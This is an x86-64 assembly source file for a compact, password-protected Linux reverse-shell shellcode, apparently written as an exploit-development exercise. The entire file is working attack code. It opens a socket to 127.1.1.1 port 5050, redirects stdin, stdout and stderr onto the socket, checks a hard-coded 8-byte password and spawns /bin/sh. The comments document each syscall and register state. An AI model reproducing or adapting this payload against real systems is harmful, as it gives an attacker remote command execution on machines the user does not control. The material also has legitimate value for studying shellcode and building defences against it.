; File: revshell.nasm
; Author: Petr Javorik
; Size: 130 bytes
; 8 byte password

global _start

section .text

_start:

    jmp short real_start
    pwd: db "somepass"      ; strictly 8 bytes

real_start:

    ; Prepare NULL for later use
    xor r9, r9

    ; // 1. Create socket
    ; int socket(int domain, int type, int protocol);
    ; int socket(AF_INET, SOCK_STREAM, 0);
    ; int socket(2, 1, 0);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push 41
    pop rax         ; syscall number
    push 2
    pop rdi         ; AF_INET = 2
    push 1
    pop rsi         ; SOCK_STREAM = 1
    imul rdx, r9    ; protocol = 0
    syscall         ; invoke system call
    mov rdi, rax    ; save file descriptor for later use
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Registers state after syscall
    ; RAX = fd number
    ; RDX = 0
    ; RDI = fd number
    ; RSI = 1
    ; R9  = 0



    ; // 2. Connect socket to remote port and address
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; int connect(RDI, {2, 0xba13, 0x0101017f}, 16);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push 42
    pop rax             ; syscall number
                        ; fd number already set in RDI
    push r9             ; (addr struct) 8 bytes zero padding
    push 0x0101017f     ; (addr.sin_addr.s_addr,4 bytes) push 0x0101017f
    push word 0xba13    ; (addr.sin_port,       2 bytes) push htons(5050)
    push word 2         ; (addr.sin_family,     2 bytes) push AF_INET

    mov rsi, rsp        ; RSI points to addr struct
    add rdx, 16         ; RDX contains sizeof(addr)
    syscall             ; invoke system call
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Registers state after syscall
    ; RAX = 0 | -1 (success | error)
    ; RDX = 16
    ; RDI = fd number
    ; RSI = addr struct
    ; R9 = 0



    ; // 3. Duplicate stdin, stdout and stderr file descriptors
    ; int dup2(int oldfd, int newfd);
    ; int dup2(RDI, 2);
    ; int dup2(RDI, 1);
    ; int dup2(RDI, 0);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push 2
    pop rsi             ; counter and newfd argument at once
    loop:
        push 33
        pop rax         ; syscall number
        syscall
        dec rsi         ; next fd number
        jns loop        ; jmp to loop if rsi >= 0, jump not sign
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Registers state after syscall
    ; RAX = 0
    ; RDI = new fd number
    ; RSI = -1
    ; RDX = 0



    ; // 4. Check password
    ; ssize_t read(int fd, void *buf, size_t count);
    ; ssize_t read(RDI, RSP, 8);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; read
                        ; RDX already set to syscall number 0
                        ; RDI already set
    push r9             ; reserve 8 null bytes in stack
    mov rsi, rsp        ; point rsi to buffer in stack
    add rdx, 8          ; read 8 bytes
    syscall

    ; compare
    mov rax, [rel pwd]  ; load password into RAX
    mov rdi, rsi        ; point RDI to data from client
    scasq               ; compare RAX and [RDI]
    jne exit            ; skip spawning shell if strings don't match
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; Registers state after syscall
    ; RAX = password string from .text memory
    ; RDI = RSI+8
    ; RSI = address of passed password
    ; RDX = 8



    ; // 7. Spawn shell
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ; int execve(                       // system call number 59 -> RAX = 59
    ;       const char *filename,       // RDI points to "/bin/bash" terminated by NULL
    ;       char *const argv[],         // RSI points to "/bin/bash" address terminated by NULL
    ;       char *const envp[]          // RDX contains NULL
    ; );
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push r9                     ; First NULL push
    mov rbx, 0x68732f2f6e69622f ; >>> '/bin//sh'[::-1].encode('hex')
    push rbx
    mov rdi, rsp                ; store /bin//sh address in RDI
    push r9                     ; Second NULL push
    mov rdx, rsp                ; set RDX
    push rdi                    ; Push address of /bin//sh
    mov rsi, rsp                ; set RSI
    push 59                     ; syscall number
    pop rax
    syscall                     ; Call the Execve syscall
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



    ; jump here if wrong password
    exit:

        ; void exit(int status);
        push 60
        pop rax
        syscall
